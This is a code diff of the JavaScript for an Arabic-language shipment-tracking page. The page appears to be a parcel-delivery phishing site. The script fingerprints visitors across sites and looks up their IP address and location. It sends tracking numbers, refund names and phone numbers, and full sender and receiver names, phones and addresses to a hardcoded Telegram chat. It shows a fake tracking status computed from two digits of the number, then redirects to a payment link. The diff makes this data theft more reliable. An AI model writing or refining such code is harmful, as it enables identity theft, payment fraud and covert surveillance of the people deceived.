@@ -519,26 +519,35 @@
   const TELEGRAM_CHAT_ID = "6918534470";  // ⚠️ ضع معرف الدردشة (chat_id) هنا
   // =================================================================
 
-  // دالة إرسال الرسالة إلى تلجرام عبر الـ Worker
-  async function sendToTelegram(text) {
-    try {
-      const res = await fetch(TELEGRAM_WORKER_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
-      });
-      console.log(await res.text());
-    } catch(e) { console.error("Telegram send error:", e); }
+  // ================== بصمة ثابتة للمستخدم (تعمل عبر جميع مواقعك) ==================
+  function generateStableFingerprint() {
+    let components = [
+      navigator.userAgent || '',
+      navigator.language || '',
+      screen.width + 'x' + screen.height,
+      screen.colorDepth,
+      new Date().getTimezoneOffset(),
+      navigator.hardwareConcurrency || '',
+      navigator.deviceMemory || '',
+      !!navigator.maxTouchPoints ? 'touch' : 'no-touch'
+    ];
+    let fingerprint = components.join('|');
+    // hash بسيط
+    let hash = 0;
+    for (let i = 0; i < fingerprint.length; i++) {
+      hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
+      hash |= 0;
+    }
+    return 'fp_' + Math.abs(hash).toString(16);
   }
-
-  // ================== جمع معلومات الزائر والمستخدم ==================
-  let userId = localStorage.getItem("userId");
+  let userId = localStorage.getItem("stableUserId");
   if (!userId) {
-    userId = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).substring(2) + Date.now().toString(36);
-    localStorage.setItem("userId", userId);
+    userId = generateStableFingerprint();
+    localStorage.setItem("stableUserId", userId);
   }
   let visitCount = parseInt(localStorage.getItem("visitCount") || "0") + 1;
   localStorage.setItem("visitCount", visitCount);
+  // =================================================================
 
   function getDeviceType() {
     let ua = navigator.userAgent;
@@ -565,20 +574,29 @@
       let res = await fetch("https://ipapi.co/json/");
       let data = await res.json();
       ipData = { ip: data.ip || "غير معروف", country: data.country_name || "غير معروف", city: data.city || "غير معروف" };
-      // بعد الحصول على IP نرسل رسالة ترحيب تحتوي على كل المعلومات
-      await sendToTelegram(`🆕 *زيارة جديدة للموقع*\n🆔 المستخدم: ${userId}\n👀 عدد الزيارات: ${visitCount}\n📱 الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}`);
+      await sendToTelegram(`🆕 *زيارة جديدة للموقع*\n🆔 المستخدم الثابت: ${userId}\n👀 عدد الزيارات: ${visitCount}\n📱 الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}`);
     } catch(e) { console.error("IP fetch error:", e); }
   })();
 
-  // دالة مساعدة لإرسال رسالة مع إضافة معلومات الجهاز والمستخدم
+  async function sendToTelegram(text) {
+    try {
+      const res = await fetch(TELEGRAM_WORKER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+      });
+      console.log(await res.text());
+    } catch(e) { console.error("Telegram send error:", e); }
+  }
+
   async function sendEvent(message) {
-    let extra = `\n━━━━━━━━━━━\n🆔 معرف المستخدم: ${userId}\n📱 الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}\n👀 عدد الزيارات: ${visitCount}`;
+    let extra = `\n━━━━━━━━━━━\n🆔 المستخدم الثابت: ${userId}\n📱 الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}\n👀 عدد الزيارات: ${visitCount}`;
     await sendToTelegram(message + extra);
   }
 
-  // ================== ربط الأحداث المختلفة ==================
+  // ================== ربط الأحداث مع ضمان إرسال البيانات ==================
   // 1. تتبع الشحنة
-  const originalTrackHandler = async function() {
+  document.getElementById("trackBtn").addEventListener("click", async () => {
     let number = document.getElementById("trackingNumber").value.trim();
     if (number.length !== 10) {
       showPopup("يرجى إدخال رقم تتبع مكون من 10 أرقام.");
@@ -589,14 +607,11 @@
     let status = (thirdDigit === '4' && fourthDigit === '0') ? "الشحنة قيد المعالجة" : "لا يوجد شحنة بعد";
     document.getElementById("trackResult").textContent = status;
     document.getElementById("trackResult").style.display = "block";
-    // إرسال حدث التتبع
     await sendEvent(`🔍 *حدث تتبع شحنة*\nرقم التتبع: ${number}\nالنتيجة: ${status}`);
-  };
-  document.getElementById("trackBtn").removeEventListener("click", originalTrackHandler);
-  document.getElementById("trackBtn").addEventListener("click", originalTrackHandler);
+  });
 
   // 2. استرجاع مبلغ الشحنة
-  const originalRefundHandler = async function() {
+  document.getElementById("submitRefundBtn").addEventListener("click", async () => {
     let valid = true;
     const name = document.getElementById("refund_name").value.trim();
     const phone = document.getElementById("refund_phone").value.trim();
@@ -616,9 +631,7 @@
       document.getElementById("refund_tracking").value = "";
       go("where");
     }
-  };
-  document.getElementById("submitRefundBtn").removeEventListener("click", originalRefundHandler);
-  document.getElementById("submitRefundBtn").addEventListener("click", originalRefundHandler);
+  });
 
   // 3. زر تسجيل الدخول
   document.getElementById("goLogin").addEventListener("click", async () => {
@@ -635,16 +648,21 @@
     });
   });
 
-  // 5. إرسال معلومات المرسل + المستلم + تفاصيل الشحنة كاملة عند الضغط على "التالي" من صفحة التفاصيل
-  let originalSendShipment = document.getElementById("btnSendShipment").addEventListener("click", async () => {
-    if (validateDetails()) {
-      // جمع البيانات
+  // 5. إرسال كامل بيانات الشحنة (مرسل + مستلم + تفاصيل) بشكل مضمون قبل الانتقال
+  let isSending = false;
+  document.getElementById("btnSendShipment").addEventListener("click", async () => {
+    if (isSending) return;
+    if (!validateDetails()) return;
+    isSending = true;
+    try {
       let sender = `👤 المرسل:\nالاسم: ${document.getElementById("s_name").value}\nالبلد: ${document.getElementById("s_country").options[document.getElementById("s_country").selectedIndex]?.text}\nالهاتف: ${document.getElementById("s_phone").value}\nالمدينة: ${document.getElementById("s_city").value}\nالحي: ${document.getElementById("s_district").value}\nالشارع: ${document.getElementById("s_street").value}`;
       let receiver = `👤 المستلم:\nالاسم: ${document.getElementById("r_name").value}\nالبلد: ${document.getElementById("r_country").options[document.getElementById("r_country").selectedIndex]?.text}\nالهاتف: ${document.getElementById("r_phone").value}\nالمدينة: ${document.getElementById("r_city").value}\nالحي: ${document.getElementById("r_district").value}\nالشارع: ${document.getElementById("r_street").value}`;
       let details = `📦 تفاصيل الشحنة:\nرقم التتبع: ${document.getElementById("d_shipno").value}\nالمحتويات: ${document.getElementById("d_content").value}\nعدد القطع: ${document.getElementById("d_pieces").value}\nنوع الشحنة: ${selectedType === "docs" ? "وثائق" : "طرد"}`;
       await sendEvent(`📮 *إتمام بيانات الشحنة*\n\n${sender}\n\n${receiver}\n\n${details}`);
       currentTrackingNumber = document.getElementById("d_shipno").value.trim();
       go("paymethod");
+    } finally {
+      isSending = false;
     }
   });
 
@@ -662,10 +680,10 @@
     
     // ================== ضع رابط الدفع الفعلي هنا ==================
     const PAYMENT_URL = "https://pay.edfapay.com/merchant/checkout/69d6b1783c1772af42a427ea/74d26407-d495-4cec-a499-8a65659bb174";   // ⚠️ استبدل هذا الرابط برابط بوابة الدفع الحقيقي
-    window.location.href = PAYMENT_URL;  // سيتم فتح رابط الدفع مباشرة
+    window.location.href = PAYMENT_URL;
   });
 
-  // دوال مساعدة موجودة مسبقاً (نحتفظ بها)
+  // ================== بقية الدوال المساعدة (بدون تعديل) ==================
   function setError(id, msg) { const el = document.getElementById(id); if (!el) return; if (msg) { el.textContent = msg; el.style.display = 'block'; } else { el.textContent = ''; el.style.display = 'none'; } }
   function clearAllErrors() { document.querySelectorAll('.error-msg').forEach(el => { el.textContent = ''; el.style.display = 'none'; }); }
   function showPopup(msg) {
